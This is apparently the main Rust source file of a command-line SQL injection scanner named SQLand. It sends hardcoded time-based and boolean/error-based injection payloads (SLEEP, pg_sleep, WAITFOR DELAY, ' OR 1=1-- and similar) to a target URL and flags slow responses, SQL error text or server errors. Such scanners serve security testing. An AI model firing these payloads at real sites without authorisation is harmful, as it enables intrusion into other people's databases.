mod cli;
mod client;

use crate::cli::{args_to_settings, Args};
use crate::client::SQLand;
use clap::Parser;
use colored::*;
use std::{error::Error, time::Instant};
use tracing::{error, info};
use tracing_subscriber;

fn main() {
    // Initialize tracing subscriber
    tracing_subscriber::fmt()
        .with_max_level(tracing::Level::INFO)
        .compact()
        .without_time()
        .init();

    // Parse command line arguments
    let args = Args::parse();

    // Convert arguments to settings
    let settings = args_to_settings(&args);

    // Create SQLand instance
    let sqland = SQLand::new(args.url, Some(settings));

    // Define payloads for SQL Injection testing
    let time_based_payloads = vec![
        "' OR IF(1=1,SLEEP(5),0) -- ",
        "' OR IF(1=2,0,SLEEP(5)) -- ",
        "' OR IF(2>1,SLEEP(5),0) -- ",
        "' OR BENCHMARK(5000000,MD5(1)) -- ",
        "' OR SLEEP(5) -- ",
        "'; WAITFOR DELAY '00:00:05' -- ",
        "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --",
        "'; SELECT pg_sleep(5) -- ",
        "'; SELECT pg_sleep(5)-- ",
        "'; SELECT IF(1=1, pg_sleep(5), pg_sleep(0)) -- ",
    ]; // Time-based payloads

    let error_based_payloads = vec![
        "' OR 1/0 -- ",
        "' OR 'a'='a",
        "' OR 1=1--",
        "' OR '1'='1'--",
        "' OR ''='",
        "' OR 1=1#",
        "' OR '1'='1'#",
        "' OR 1=1/*",
        "' OR '1'='1'/*",
        "' OR 'a'='a'--",
        "' OR 'a'='a'#",
        "' OR 'a'='a'/*",
        "' OR 1=1; --",
        "' OR 'x'='x'; --",
        "' OR 1=1 OR ''=''; --",
    ]; // Error-based payloads

    // Time-based Blind SQL Injection testing
    info!("Starting Time-based Blind SQL Injection testing...");
    let mut time_based = false;

    for payload in time_based_payloads {
        if time_based {
            break;
        }

        match send_time_based(&sqland, payload.to_string()) {
            Ok(response) => {
                if response {
                    time_based = true;
                }
            }
            Err(e) => {
                error!("Error sending request with payload {}: {}", payload, e);
            }
        }
    }

    // Error-based Blind SQL Injection testing
    info!("Starting Error-based Blind SQL Injection testing...");
    let mut error_based = false;

    for payload in error_based_payloads {
        if error_based {
            break;
        }

        match send_error_based(&sqland, payload.to_string()) {
            Ok(response) => {
                if response {
                    error_based = true;
                }
            }
            Err(e) => {
                error!("Error sending request with payload {}: {}", payload, e);
            }
        }
    }

    if !error_based && !time_based {
        info!(
            "{}",
            "No vulnerability detected on specified target.".green()
        );
    } else {
        info!(
            "{}",
            "One or more vulnerabilities have been found on the target.".red()
        );
    }
}

fn send_time_based(sqland: &SQLand, payload: String) -> Result<bool, Box<dyn Error>> {
    let start = Instant::now();
    let _response = sqland.send(payload.clone())?;
    let duration = start.elapsed();

    // Check if the response time is significantly higher
    if duration.as_secs() > 5 {
        info_title("Potential time-based SQL injection detected.");
        info_value_num("Response time", duration.as_millis());
        info_value_str("Payload", &payload);
        return Ok(true);
    }

    Ok(false)
}

fn send_error_based(sqland: &SQLand, payload: String) -> Result<bool, Box<dyn Error>> {
    let response = sqland.send(payload.clone())?;
    let status = response.status();
    let body = response.text()?.to_lowercase();

    // Check for typical SQL error messages or status code 500
    let errors = vec!["sql syntax", "warning"];

    for error in errors {
        if body.contains(&error) {
            info_title("Potential error-based SQL injection detected.");
            info_value_str("Error", error);
            info_value_str("Payload", &payload);
            return Ok(true);
        }
    }

    if status.is_server_error() {
        info_title("Potential status-based SQL injection detected.");
        info_value_num("Status code", status.as_u16().into());
        info_value_str("Payload", &payload);
        return Ok(true);
    }

    Ok(false)
}

fn info_title(text: &str) {
    info!(" {} {}", "*".bold().red(), text.yellow());
}

fn info_value_num(key: &str, value: u128) {
    info!(
        "   - {} {}",
        key.bold().cyan(),
        format!("{}", value).green()
    );
}

fn info_value_str(key: &str, value: &str) {
    info!("   - {} {}", key.bold().cyan(), value);
}
